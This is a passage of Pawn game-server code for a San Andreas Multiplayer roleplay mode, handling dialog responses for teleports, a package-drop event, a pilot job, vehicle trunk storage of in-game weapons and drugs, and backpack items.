				SMG_SetPlayerPos( playerid, jobsInfos[ listitem ][ jPos ][ 0 ], jobsInfos[ listitem ][ jPos ][ 1 ], jobsInfos[ listitem ][ jPos ][ 2 ] );
			}
			SetPlayerInterior( playerid, 0 );
			SetPlayerVirtualWorld( playerid, 0 );
			SCMF(playerid, 0x4282C0FF, "(TP): Teleportovali ste se do posla {FFFFFF}%s.", jobsInfos[ listitem ][ jName ] );
		}
	}
	else if(dialogid == dialog_ports_ORGS )
	{
	    if( !response ) return 1;
		if( response )
		{
		    listitem++;

		    UcitajObjekte(playerid);
		    new tmpcar = GetPlayerVehicleID( playerid );
			if( GetPlayerState( playerid ) == 2 )
			{
		 		SMG_SetVehiclePos( tmpcar, org_info[ listitem ][ oPortX ], org_info[ listitem ][ oPortY ], org_info[ listitem ][ oPortZ ] );
		 	}
			else
			{
				SMG_SetPlayerPos( playerid, org_info[ listitem ][ oPortX ], org_info[ listitem ][ oPortY ], org_info[ listitem ][ oPortZ ] );
				SetPlayerFacingAngle(playerid, org_info[ listitem ][ oPortA ]);
			}
			SetPlayerInterior( playerid, 0 );
			SetPlayerVirtualWorld( playerid, 0 );

			SCMF(playerid, 0x4282C0FF, "(TP): Teleportovali ste se do organizacije {FFFFFF}%s.", org_info[ listitem ][ oName ] );
		}
	}
	//
	else if(dialogid == dialog_STARTPAKET )
	{
	    if( !response ) return 1;
	    if( response )
		{
	        ServerInfo[ PaketPoceo ] = true;
            ServerInfo[ PaketID ] = listitem;
            ServerInfo[ PaketNijeNaSvomMestu ] = false;
            KillTimer(ServerInfo[ PaketTimer ]);

            if( IsValidDynamicObject( ServerInfo[ PaketObject ] ) ) DestroyDynamicObject( ServerInfo[ PaketObject ] );

            ServerInfo[ PaketObject ] = CreateDynamicObject(328, paketInfo[ ServerInfo[ PaketID ] ][ p_p_pos ][ 0 ], paketInfo[ ServerInfo[ PaketID ] ][ p_p_pos ][ 1 ], paketInfo[ ServerInfo[ PaketID ] ][ p_p_pos ][ 2 ], 0.0, 0.0, 0.0, 0, 0, -1, .priority = 1);

            PaketNewPos[0] = paketInfo[ServerInfo[PaketID]][p_p_pos][0];
            PaketNewPos[1] = paketInfo[ServerInfo[PaketID]][p_p_pos][1];
            PaketNewPos[2] = paketInfo[ServerInfo[PaketID]][p_p_pos][2];
            ServerInfo[ PaketStvari ][ 0 ] = 5000 + random(2500);
            ServerInfo[ PaketStvari ][ 1 ] = 50 + random(100);
            ServerInfo[ PaketVreme ] = 0;

			foreach( new i : Player)
			{
                if( GetFactionType( i ) == ORG_TIP_MAFIJA || GetFactionType( i ) == ORG_TIP_BANDA || PlayerInfo[ i ][ xAdmin ] > 0 || PlayerInfo[ i ][ xSpecAdmin ] > 0 || !UzeoOpremu[ i ])
				{
					SCMF( i, ZUTA, "(PAKET): Paket je dostavljen. Lokacija: {FFFFFF}%s.", paketInfo[ ServerInfo[ PaketID ] ][ p_loc_name ] );
					SCMF( i, ZUTA, "(PAKET): U paketu se nalazi {FFFFFF}(%d) {FFFF00}materijala i {FFFFFF}(%dg) {FFFF00}droge.", ServerInfo[ PaketStvari ][ 0 ], ServerInfo[ PaketStvari ][ 1 ] );
					SendClientMessage( i, ZUTA, "(PAKET): Ukoliko niko ne pokupi paket narednih {FFFFFF}(15) {FFFF00}minuta, paket ce nestati." );    
					SendClientMessage( i, ZUTA, "(PAKET): SERVER VAM JE POSTAVIO MARKER KOJI TRAJE 10 SEKUNDI." );

                    SMG_SetPlayerCheckpoint( i, paketInfo[ ServerInfo[ PaketID ] ][ p_p_pos ][ 0 ], paketInfo[ ServerInfo[ PaketID ] ][ p_p_pos ][ 1 ], paketInfo[ ServerInfo[ PaketID ] ][ p_p_pos ][ 2 ], 2.0 );
					MarkerPaket[ i ] = 10;
					CheckpointStatus[ i ] = 0;
				}
			}
	    }
	}
	else if(dialogid == dialog_PILOT )
	{
		if( !response ) return 1;
		if( response )
		{
			switch( listitem )
			{
			    case 0:
				{
				    if( PosaoVozilo[ playerid ] != -1 )
					{
					    VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false;
				        DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]);
					    ResetVehicle( PosaoVozilo[ playerid ] );
						SMG_DestroyVehicle( PosaoVozilo[ playerid ] );
						PosaoVozilo[ playerid ] = -1;
					}
				    if( PosaoTrailer[ playerid ] != -1 )
					{
					    VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false;
				        DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]);
					    ResetVehicle( PosaoTrailer[ playerid ] );
						SMG_DestroyVehicle( PosaoTrailer[ playerid ] );
						PosaoTrailer[ playerid ] = -1;
					}

				    PosaoVozilo[ playerid ] = SMG_CreateVehicle(519, 1926.1537,-2399.1230,13.5469,182.7330, 1, 0, -1 );
					LinkVehicleToInterior( PosaoVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( PosaoVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( PosaoVozilo[ playerid ] );
					vCanDrive[ PosaoVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, PosaoVozilo[ playerid ], 0 );
					ResetVehicleStatistics( PosaoVozilo[ playerid ] );

					VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = true;
					new string[ 20+MAX_PLAYER_NAME+1 ];
			  		format( string, sizeof( string ), "(%s)\n{FFFFFF}%s", jobsInfos[PlayerInfo[playerid][xPosao]-1][jLabel], ImeIgraca(playerid) );
					VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x36AB00FF, 0.0, 0.0, -100.0, 15.0, IPI, PosaoVozilo[ playerid ], 0, -1, -1, -1, 15.0, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;
				    GetVehicleParamsEx( PosaoVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( PosaoVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

    				SMG_SetPlayerCheckpoint( playerid, 1847.4221, -2414.0798, 13.5547, 5.0 );
					LetZG[ playerid ] = 1;
					CheckpointStatus[ playerid ] = 20;
					SendJobMessage( playerid, "Krenuli ste sa poslom, prevozite putnike u ZG.");
					StaroVreme[ playerid ] = gettime();
    				NovoVreme[ playerid ] = 100;
			    }
			    case 1:
				{
				    if( PosaoVozilo[ playerid ] != -1 )
					{
					    VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false;
				        DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]);
					    ResetVehicle( PosaoVozilo[ playerid ] );
						SMG_DestroyVehicle( PosaoVozilo[ playerid ] );
						PosaoVozilo[ playerid ] = -1;
					}
				    if( PosaoTrailer[ playerid ] != -1 )
					{
					    VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false;
				        DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]);
					    ResetVehicle( PosaoTrailer[ playerid ] );
						SMG_DestroyVehicle( PosaoTrailer[ playerid ] );
						PosaoTrailer[ playerid ] = -1;
					}

				    PosaoVozilo[ playerid ] = SMG_CreateVehicle(519, 1926.1537,-2399.1230,13.5469,182.7330, 1, 0, -1 );
					LinkVehicleToInterior( PosaoVozilo[ playerid ], GetPlayerInterior( playerid ) );
			        SetVehicleVirtualWorld( PosaoVozilo[ playerid ], GetPlayerVirtualWorld( playerid ) );
			        ResetVehicle( PosaoVozilo[ playerid ] );
					vCanDrive[ PosaoVozilo[ playerid ] ] = 1;
				    PutPlayerInVehicle( playerid, PosaoVozilo[ playerid ], 0 );
					ResetVehicleStatistics( PosaoVozilo[ playerid ] );

					VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = true;
					new string[ 20+MAX_PLAYER_NAME+1 ];
			  		format( string, sizeof( string ), "(%s)\n{FFFFFF}%s", jobsInfos[PlayerInfo[playerid][xPosao]-1][jLabel], ImeIgraca(playerid) );
					VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ] = CreateDynamic3DTextLabel(string, 0x36AB00FF, 0.0, 0.0, -100.0, 15.0, IPI, PosaoVozilo[ playerid ], 0, -1, -1, -1, 15.0, -1, 0);

					new engine, lights, alarm, doors, bonnet, boot, objective;
				    GetVehicleParamsEx( PosaoVozilo[ playerid ], engine, lights, alarm, doors, bonnet, boot, objective );
				    SetVehicleParamsEx( PosaoVozilo[ playerid ], 1, 0, alarm, 0, 0, 0, objective );

    				SMG_SetPlayerCheckpoint( playerid, 1847.4221, -2414.0798, 13.5547, 5.0 );
					LetSA[ playerid ] = 1;
					CheckpointStatus[ playerid ] = 21;
					SendJobMessage( playerid, "Krenuli ste sa poslom, prevozite putnike u SA.");
					StaroVreme[ playerid ] = gettime();
    				NovoVreme[ playerid ] = 80;
			    }
			}
		}
	}
	else if(dialogid == dialog_GEPEK )
	{
		if( !response ) return 1;
		if( response )
		{
		    new vehicleid, found, engine, lights, alarm, doors, bonnet, boot, objective;
		    for( new i = 0; i <= GetVehiclePoolSize(); i++)
			{
		        new Float:X, Float:Y, Float:Z;
		        GetVehiclePos(i, X, Y, Z);
		        if( IsPlayerInRangeOfPoint( playerid, 5.0, X, Y, Z))
				{
		            vehicleid = i;
		            found = 1;
		            break;
		        }
		        else continue;
		    }
			if( found == 0 ) return SendErrorMessage( playerid, "Niste blizu vozila.");

		    new Float:vehPos[ 3 ];
			getPosBehindVehicle( vehicleid, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ], 0.0 );
			if( !IsPlayerInRangeOfPoint( playerid, 2, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ] ) ) return SendErrorMessage( playerid, "Morate biti pored prtljaznika." );

			if( IsANoTrunkVehicle( vehicleid ) ) return SendErrorMessage( playerid, "Ovo vozilo nema prtljaznik!");
			if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama.");
			if( IsVehicleBajs( vehicleid ) || IsVehicleMotor( vehicleid ) || IsVehicleBrod( vehicleid ) ) {
				SendErrorMessage( playerid, "Nepoznata akcija.");
				return 1;
			}

			if( VehicleInfo[ vehicleid ][ vUsage ] == PRIVATNO_VOZILO )
			{
			    new slot = -1;
			    for( new j = 0; j < MAX_VEH_SLOT; j ++ )
				{
					if( player_veh[ playerid ][ vehicle_id ][ j ] != -1 && player_veh[ playerid ][ vehicle_id ][ j ] == vehicleid )
					{
				  		slot = j;
						break;
					}
				}
				if( slot == -1 ) return SendErrorMessage( playerid, "Nemate kljuceve ovog vozila.");
			}
			else if( VehicleInfo[ vehicleid ][ vUsage ] == ORGANIZACIJSKO_VOZILO )
			{
				if( VehicleInfo[ vehicleid ][ vOrganization ] != PlayerInfo[ playerid ][ xClan ] ) return SendErrorMessage( playerid, "Nemate kljuceve ovog vozila.");
			}
		    else return SendErrorMessage( playerid, "Nemate kljuceve ovog vozila.");

		    new autoid = vehicleid;
		    switch( listitem )
			{
				case 0:
				{
				    GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective );
					if( boot == 0 )
					{
						SetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, 1, objective );
					}
					else
					{
						SetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, 0, objective );
					}
				}
				case 1:
				{
				    GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective );
					if( boot == 0 ) return SendErrorMessage( playerid, "Morate prvo otvoriti gepek." );

				    new wepname1[32], wepname2[32], wepname3[32];

	                if( VehicleInfo[ autoid ][ vWeap1 ] != 0 ) format( wepname1, sizeof( wepname1 ), "%s", WeapNames[ VehicleInfo[ autoid ][ vWeap1 ] ] );
					else strmid(wepname1, "None", 0, 5);

					if( VehicleInfo[ autoid ][ vWeap2 ] != 0) format( wepname2, sizeof( wepname2 ), "%s", WeapNames[ VehicleInfo[ autoid ][ vWeap2 ] ] );
					else strmid(wepname2, "None", 0, 5);

				    if( VehicleInfo[ autoid ][ vMelee ] != 0) format( wepname3, sizeof( wepname3 ), "%s", WeapNames[ VehicleInfo[ autoid ][ vMelee ] ] );
					else strmid(wepname3, "None", 0, 5);

	                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	                format( globalstring, sizeof( globalstring ), "{4282C0}- Materijali: {FFFFFF}(%d)\n", VehicleInfo[ autoid ][ vMaterijali ] );
	               	strcat( DialogStrgEx, globalstring );

	                format( globalstring, sizeof( globalstring ), "{4282C0}- Droga: {FFFFFF}(%dg)\n", VehicleInfo[ autoid ][ vDrugAmmount ] );
	               	strcat( DialogStrgEx, globalstring );

	               	format( globalstring, sizeof( globalstring ), "{4282C0}- Melee: {FFFFFF}%s\n", wepname3 );
					strcat( DialogStrgEx, globalstring );

					format( globalstring, sizeof( globalstring ), "{4282C0}- Oruzja 1: {FFFFFF}%s {4282C0}| Metaka: {FFFFFF}(%d)\n", wepname1, VehicleInfo[ autoid ][ vAmmo1 ] );
					strcat( DialogStrgEx, globalstring );

					format( globalstring, sizeof( globalstring ), "{4282C0}- Oruzja 2: {FFFFFF}%s {4282C0}| Metaka: {FFFFFF}(%d)\n", wepname2, VehicleInfo[ autoid ][ vAmmo2 ] );
					strcat( DialogStrgEx, globalstring );

	               	ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "OK", "" );
	    			strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
				}
				case 2:
				{
				    GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective );
					if( boot == 0 ) return SendErrorMessage( playerid, "Morate prvo otvoriti gepek." );

				    ChosenVehicle[ playerid ] = autoid;
				    ShowPlayerDialog( playerid, dialog_GEPEKOSTAVI, DIALOG_STYLE_LIST, D_NASLOV,
																									"{4282C0}(1). {FFFFFF}Ostavi oruzje\n\
																									{4282C0}(2). {FFFFFF}Ostavi drogu\n\
																									{4282C0}(3). {FFFFFF}Ostavi materijale", "Potvrdi", "Odustani" );
				}
				case 3:
				{
				    GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective );
					if( boot == 0 ) return SendErrorMessage( playerid, "Morate prvo otvoriti gepek." );

				    ChosenVehicle[ playerid ] = autoid;
				    ShowPlayerDialog( playerid, dialog_GEPEKIZVADI, DIALOG_STYLE_LIST, D_NASLOV,
																									"{4282C0}(1). {FFFFFF}Izvadi oruzje\n\
																									{4282C0}(2). {FFFFFF}Izvadi drogu\n\
																									{4282C0}(3). {FFFFFF}Izvadi materijale", "Potvrdi", "Odustani" );
				}
		    }
		}
	}
	else if(dialogid == dialog_GEPEKIZVADI )
	{
		if( !response ) return 1;
		if( response )
		{
		    new vehicleid, found;
		    for( new i = 0; i <= GetVehiclePoolSize(); i++)
			{
		        new Float:X, Float:Y, Float:Z;
		        GetVehiclePos(i, X, Y, Z);
		        if( IsPlayerInRangeOfPoint( playerid, 5.0, X, Y, Z))
				{
		            vehicleid = i;
		            found = 1;
		            break;
		        }
		        else continue;
		    }
			if( found == 0 ) return SendErrorMessage( playerid, "Niste blizu vozila.");

		    new Float:vehPos[ 3 ];
			getPosBehindVehicle( vehicleid, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ], 0.0 );
			if( !IsPlayerInRangeOfPoint( playerid, 2, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ] ) ) return SendErrorMessage( playerid, "Morate biti pored prtljaznika." );

			if( IsANoTrunkVehicle( vehicleid ) ) return SendErrorMessage( playerid, "Ovo vozilo nema prtljaznik!");
			if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama.");
			if( IsVehicleBajs( vehicleid ) || IsVehicleMotor( vehicleid ) || IsVehicleBrod( vehicleid ) ) {
				SendErrorMessage( playerid, "Nepoznata akcija.");
				return 1;
			}

			new autoid = ChosenVehicle[ playerid ];
			if( VehicleInfo[ autoid ][ vUsage ] == PRIVATNO_VOZILO )
			{
				if( strcmp( ImeIgraca( playerid ), VehicleInfo[ autoid ][ vOwner ], true ) == 0 ) { }
				else return SendErrorMessage( playerid, "Nemate kljuceve ovog vozila.");
			}
			else if( VehicleInfo[ autoid ][ vUsage ] == ORGANIZACIJSKO_VOZILO )
			{
				if( VehicleInfo[ autoid ][ vOrganization ] != PlayerInfo[ playerid ][ xClan ] ) return SendErrorMessage( playerid, "Nemate kljuceve ovog vozila.");
			}
		    else
			{
			    //
			}

			switch( listitem )
			{
			    case 0:
				{
			        new wepname1[32], wepname2[32], wepname3[32];
				    if( VehicleInfo[ autoid ][ vMelee ] == 0 && VehicleInfo[ autoid ][ vWeap1 ] == 0 && VehicleInfo[ autoid ][ vWeap2 ] == 0) return SendErrorMessage( playerid, "Svi slotovi su prazni.");

					if( VehicleInfo[ autoid ][ vWeap1 ] != 0 ) format( wepname1, sizeof( wepname1 ), "%s", WeapNames[ VehicleInfo[ autoid ][ vWeap1 ] ] );
					else format(wepname1, sizeof(wepname1), "None");

					if( VehicleInfo[ autoid ][vWeap2] != 0 ) format( wepname2, sizeof( wepname2 ), "%s", WeapNames[ VehicleInfo[ autoid ][ vWeap2 ] ] );
					else format(wepname2, sizeof(wepname2), "None");

				    if( VehicleInfo[ autoid ][vMelee] != 0 ) format( wepname3, sizeof( wepname3 ), "%s", WeapNames[ VehicleInfo[ autoid ][ vMelee ] ] );
					else format(wepname3, sizeof(wepname3), "None");

				    TrunkVehicle[ playerid ] = autoid;
				    format( globalstring, sizeof( globalstring ), "%s\n%s\n%s", wepname1, wepname2, wepname3 );
					ShowPlayerDialog( playerid, dialog_VEHICLEWEPTAKE, DIALOG_STYLE_LIST, D_NASLOV, globalstring, "Potvrdi", "Odustani" );
			    }
			    case 1: ShowPlayerDialog( playerid, dialog_VEHICLETAKEDRUG, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu droge za uzimanje.", "Potvrdi", "Odustani" );
			    case 2: ShowPlayerDialog( playerid, dialog_VEHICLETAKEMATS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu materijala za uzimanje iz gepeka.", "Potvrdi", "Odustani" );
			}
		}
	}
	else if(dialogid == dialog_GEPEKOSTAVI )
	{
		if( !response ) return 1;
		if( response )
		{
		    new vehicleid, found;
		    for( new i = 0; i <= GetVehiclePoolSize(); i++)
			{
		        new Float:X, Float:Y, Float:Z;
		        GetVehiclePos(i, X, Y, Z);
		        if( IsPlayerInRangeOfPoint( playerid, 5.0, X, Y, Z))
				{
		            vehicleid = i;
		            found = 1;
		            break;
		        }
		        else continue;
		    }
			if( found == 0 ) return SendErrorMessage( playerid, "Niste blizu vozila.");

		    new Float:vehPos[ 3 ];
			getPosBehindVehicle( vehicleid, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ], 0.0 );
			if( !IsPlayerInRangeOfPoint( playerid, 2, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ] ) ) return SendErrorMessage( playerid, "Morate biti pored prtljaznika." );

			if( IsANoTrunkVehicle( vehicleid ) ) return SendErrorMessage( playerid, "Ovo vozilo nema prtljaznik!");
			if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama.");
			if( IsVehicleBajs( vehicleid ) || IsVehicleMotor( vehicleid ) || IsVehicleBrod( vehicleid ) )
			{
				SendErrorMessage( playerid, "Nepoznata akcija.");
				return 1;
			}

			new autoid = ChosenVehicle[ playerid ];
			if( VehicleInfo[ autoid ][ vUsage ] == PRIVATNO_VOZILO )
			{
				if( strcmp( ImeIgraca( playerid ), VehicleInfo[ autoid ][ vOwner ], true ) == 0 ) { }
				else return SendErrorMessage( playerid, "Nemate kljuceve ovog vozila.");
			}
			else if( VehicleInfo[ autoid ][ vUsage ] == ORGANIZACIJSKO_VOZILO )
			{
				if( VehicleInfo[ autoid ][ vOrganization ] != PlayerInfo[ playerid ][ xClan ] ) return SendErrorMessage( playerid, "Nemate kljuceve ovog vozila.");
			}
		    else
			{
			    //
			}

			switch( listitem )
			{
			    case 0:
				{
			        if( GetFactionType( playerid ) == ORG_TIP_VLADINA || GetFactionType( playerid ) == ORG_TIP_HITMAN )
					{
				        SendErrorMessage( playerid, "Vasa orga nema razloga ubacivati oruzja u gepek.");
						return 1;
					}
					if( WARPInfo[ playerid ][ WARIgrac ] != -1 ) return SendErrorMessage( playerid, "Ne mozes ovo dok si u waru." );
                    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok si na dmu." );
					new wepname[32];
					if( ForbiddenWeap( playerid ) ) return SendErrorMessage( playerid, "Ne mozes ubaciti zabranjena oruzja u gepek." );
					if( IsMeleeWeapon( GetWeapon( playerid ) ) && VehicleInfo[ autoid ][ vMelee ] != 0 ) return SendErrorMessage( playerid, "Slot za melee oruzja je zauzet!");
					if( !IsMeleeWeapon( GetWeapon( playerid ) ) && VehicleInfo[ autoid ][ vWeap1 ] != 0 && VehicleInfo[ autoid ][ vWeap2 ] != 0) return SendErrorMessage(playerid,  "Slotovi za vatrena oruzja su zauzeti!");
					if( IsMeleeWeapon( GetWeapon( playerid ) ) )
					{
					    format( wepname, sizeof( wepname ), "%s", WeapNames[ GetWeapon( playerid ) ] );
				        VehicleInfo[ autoid ][ vMelee ] = GetWeapon( playerid );
				        RemovePlayerWeapon( playerid, GetWeapon( playerid ) );

                        new q[ 128 ];
						mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_weapon_melee` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
													VehicleInfo[ autoid ][ vMelee ],
													VehicleInfo[ autoid ][ vSqlID ] );

						mysql_tquery( mSQL, q );

					    SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s sprema %s u prtljaznik.", ImeIgraca( playerid ), wepname);
					}
					else if( VehicleInfo[ autoid ][ vWeap1 ] == 0 )
					{
						if( ( VehicleInfo[ autoid ][ vAmmo1 ] + GetPlayerAmmo( playerid ) ) < 501 )
						{
						    format( wepname, sizeof( wepname ), "%s", WeapNames[ GetWeapon( playerid ) ] );
				            VehicleInfo[ autoid ][ vAmmo1 ] = GetPlayerAmmo( playerid );
				            VehicleInfo[ autoid ][ vWeap1 ] = GetWeapon( playerid );
							RemovePlayerWeapon(playerid, GetWeapon( playerid ) );

                            new q[ 128 ];
							mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_weapon_slot_1` = '%d', `v_weapon_ammo_1` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
														VehicleInfo[ autoid ][ vWeap1 ],
														VehicleInfo[ autoid ][ vAmmo1 ],
														VehicleInfo[ autoid ][ vSqlID ] );

							mysql_tquery( mSQL, q );

							SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s sprema %s u prtljaznik.", ImeIgraca( playerid ), wepname);
						}
						else SendErrorMessage(playerid,  "U slot mozete staviti najvise 500 metaka!");
					}
					else if( VehicleInfo[ autoid ][ vWeap2 ] == 0)
					{
						if( ( VehicleInfo[ autoid ][ vAmmo2 ] + GetPlayerAmmo( playerid ) ) < 501 )
						{
						    format( wepname, sizeof( wepname ), "%s", WeapNames[ GetWeapon( playerid ) ] );
				            VehicleInfo[ autoid ][ vAmmo2 ] = GetPlayerAmmo( playerid );
				            VehicleInfo[ autoid ][ vWeap2 ] = GetWeapon( playerid );
							RemovePlayerWeapon( playerid, GetWeapon( playerid ) );

							new q[ 128 ];
							mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_weapon_slot_2` = '%d', `v_weapon_ammo_2` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
														VehicleInfo[ autoid ][ vWeap2 ],
														VehicleInfo[ autoid ][ vAmmo2 ],
														VehicleInfo[ autoid ][ vSqlID ] );

							mysql_tquery( mSQL, q );

							SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s sprema %s u prtljaznik.", ImeIgraca( playerid ), wepname);
						}
						else SendErrorMessage(playerid,  "U slot mozete staviti najvise 500 metaka!");
					}
			    }
			    case 1: ShowPlayerDialog( playerid, dialog_VEHICLEPUTDRUG, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu droge za ostavljanje.", "Potvrdi", "Odustani" );
			    case 2: ShowPlayerDialog( playerid, dialog_VEHICLEPUTMATS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu materijala za ostavljanje.", "Potvrdi", "Odustani" );
			}
		}
	}
	else if(dialogid == dialog_BACKPACK)
	{
		if(!response) return 1;
		if(response)
		{
		    switch(listitem)
		    {
		        case 0: ChosenItem[playerid] = ITEM_PIZZA;
				case 1: ChosenItem[playerid] = ITEM_SOK;
				case 2: ChosenItem[playerid] = ITEM_PIVO;
				case 3: ChosenItem[playerid] = ITEM_HAMBI;
				case 4: ChosenItem[playerid] = ITEM_RIBA;
				case 5: ChosenItem[playerid] = ITEM_LAPTOP;
				case 6: ChosenItem[playerid] = ITEM_DROGA;
				case 7: ChosenItem[playerid] = ITEM_MATS;
				case 8: ChosenItem[playerid] = ITEM_ORUZJE1;
				case 9: ChosenItem[playerid] = ITEM_ORUZJE2;
				case 10: ChosenItem[playerid] = ITEM_ORUZJE3;
		    }
		    ShowPlayerDialog(playerid, dialog_BACKPACK_2, DIALOG_STYLE_LIST, "Torba", "{4282C0}(1). {FFFFFF}Koristi item\n\
		    																		   {4282C0}(2). {FFFFFF}Baci u kontejner", "Odaberi", "Odustani");
		}
	}
	else if(dialogid == dialog_BACKPACK_2)
	{
		if( !response ) return 1;
		if( response )
		{
		    new itemid = ChosenItem[ playerid ];
		    switch( listitem )
		    {
		        case 0:
		        {
                    if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes dok si u vozilu." );
		            CallLocalFunction( "UseBackpackItem", "dd", playerid, itemid );
		        }
		        case 1:
		        {
		            if( GetNearestContainer( playerid ) != -1 )
		            {
						CallLocalFunction( "DropBackpackItem", "dd", playerid, itemid );
					}
					else SendErrorMessage( playerid, "Nisi pored kontejnera." );
		        }
		    }
		}
	}
	else if(dialogid == dialog_BACKPACKTAKEGUN_1)
	{
		if(!response) return 1;
		if(response)
		{
			new kolicina;
			if( sscanf( inputtext, "d", kolicina ) ) return ShowPlayerDialog( playerid, dialog_BACKPACKTAKEGUN_1, DIALOG_STYLE_INPUT, "Torba - Gun 1", "{FFFFFF}* Unesite kolicinu metaka koliko zelite uzeti iz torbe:", "Potvrdi", "Odustani" );
	       	if( kolicina < 1 || kolicina > 100 ) return SendErrorMessage( playerid, "Ne mozete manje od 1 i vise od 100 odjednom.");
	       	if( PlayerInfo[playerid][xTorba_OruzjeM][0] < kolicina ) return SendErrorMessage( playerid, "Nemate toliko metaka u torbi.");

			GiveWeaponToPlayer( playerid, PlayerInfo[playerid][xTorba_Oruzje][0], kolicina);
			SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s vadi %s iz torbe.", ImeIgraca( playerid ), WeaponInfos[ PlayerInfo[playerid][xTorba_Oruzje][0] ][ wName ] );
			SendInfoMessage( playerid, "Izvadili ste iz torbe %s.", WeaponInfos[ PlayerInfo[playerid][xTorba_Oruzje][0] ][ wName ] );

			PlayerInfo[playerid][xTorba_OruzjeM][0] -= kolicina;
			if(PlayerInfo[playerid][xTorba_OruzjeM][0] == 0) PlayerInfo[playerid][xTorba_Oruzje][0] = 0;
            sql_user_update_integer(playerid, "xTorba_Oruzje_1", PlayerInfo[playerid][xTorba_Oruzje][0]);
            sql_user_update_integer(playerid, "xTorba_OruzjeM_1", PlayerInfo[playerid][xTorba_OruzjeM][0]);			
		}
	}
	else if(dialogid == dialog_BACKPACKTAKEGUN_2)
	{
		if(!response) return 1;
		if(response)
		{
			new kolicina;
			if( sscanf( inputtext, "d", kolicina ) ) return ShowPlayerDialog( playerid, dialog_BACKPACKTAKEGUN_2, DIALOG_STYLE_INPUT, "Torba - Gun 2", "{FFFFFF}* Unesite kolicinu metaka koliko zelite uzeti iz torbe:", "Potvrdi", "Odustani" );
	       	if( kolicina < 1 || kolicina > 100 ) return SendErrorMessage( playerid, "Ne mozete manje od 1 i vise od 100 odjednom.");
	       	if( PlayerInfo[playerid][xTorba_OruzjeM][1] < kolicina ) return SendErrorMessage( playerid, "Nemate toliko metaka u torbi.");

			GiveWeaponToPlayer( playerid, PlayerInfo[playerid][xTorba_Oruzje][1], kolicina);
			SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s vadi %s iz torbe.", ImeIgraca( playerid ), WeaponInfos[ PlayerInfo[playerid][xTorba_Oruzje][1] ][ wName ] );
			SendInfoMessage( playerid, "Izvadili ste iz torbe %s.", WeaponInfos[ PlayerInfo[playerid][xTorba_Oruzje][1] ][ wName ] );

			PlayerInfo[playerid][xTorba_OruzjeM][1] -= kolicina;
			if(PlayerInfo[playerid][xTorba_OruzjeM][1] == 0) PlayerInfo[playerid][xTorba_Oruzje][1] = 0;
            sql_user_update_integer(playerid, "xTorba_Oruzje_2", PlayerInfo[playerid][xTorba_Oruzje][1]);
            sql_user_update_integer(playerid, "xTorba_OruzjeM_2", PlayerInfo[playerid][xTorba_OruzjeM][1]);			
		}
	}
	else if(dialogid == dialog_BACKPACKTAKEGUN_3)
	{
		if(!response) return 1;
		if(response)
		{
			new kolicina;
